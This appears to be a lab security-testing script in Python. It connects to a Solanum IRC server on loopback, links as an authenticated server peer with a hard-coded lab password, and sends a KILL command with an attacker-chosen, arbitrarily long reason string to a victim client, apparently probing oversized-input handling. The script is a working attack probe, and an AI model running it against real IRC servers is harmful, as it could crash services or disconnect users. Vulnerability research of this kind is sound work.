#!/usr/bin/env python3
"""Lab-only authenticated S2S KILL probe against a 127.0.0.1 Solanum.

Sequence: local victim client, PASS/CAPAB/SERVER as a peer (PR:H credential),
then KILL whose reason is `A` * N bytes. Never contacts anything off loopback.
"""
import socket
import os
import time
import sys
PORT = int(sys.argv[1])
N = int(sys.argv[2])
TAG = sys.argv[3] if len(sys.argv) > 3 else "probe"
PEER = __import__("os").environ.get("PEER_NAME", "link.b.")
SID = __import__("os").environ.get("PEER_SID", "2AB")
VICTIM = __import__("os").environ.get("VICTIM_NICK", "victim")
PATH = __import__("os").environ.get("KILL_PATH", "labpath")
HOST = "127.0.0.1"


def conn():
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.settimeout(1.0)
    return s


def drain(s, label, seconds=0.6):
    end = time.time() + seconds
    out = b""
    while time.time() < end:
        try:
            chunk = s.recv(65536)
        except socket.timeout:
            continue
        if not chunk:
            break
        out += chunk
    text = out.decode("utf-8", "replace")
    print(f"-- {label} --", flush=True)
    print(text[:4000], flush=True)
    return text


victim = conn()
victim.sendall(f"NICK {VICTIM}\r\nUSER {VICTIM} 0 0 :lab victim\r\n".encode())
drain(victim, "victim-registration", 0.5)

peer = conn()
peer.sendall((
    f"PASS labsecret TS 6 :{SID}\r\n"
    "CAPAB :QS EX IE ENCAP CHW KLN UNKLN TB SAVE EUID BAN MLOCK EBMASK\r\n"
    f"SERVER {PEER} 1 :lab authenticated peer\r\n"
).encode())
hello = drain(peer, "peer-handshake", 0.8)
if "ERROR" in hello or PEER not in hello:
    print("-- handshake suspicious; continuing anyway --", flush=True)

reason = b"A" * N
peer.sendall(f":{SID} KILL {VICTIM} :{PATH} ".encode() + reason + b"\r\n")
print(f"-- sent KILL reason_len={N} tag={TAG} --", flush=True)
drain(peer, "post-kill", 1.0)
drain(victim, "victim-post-kill", 0.5)
peer.close()
victim.close()
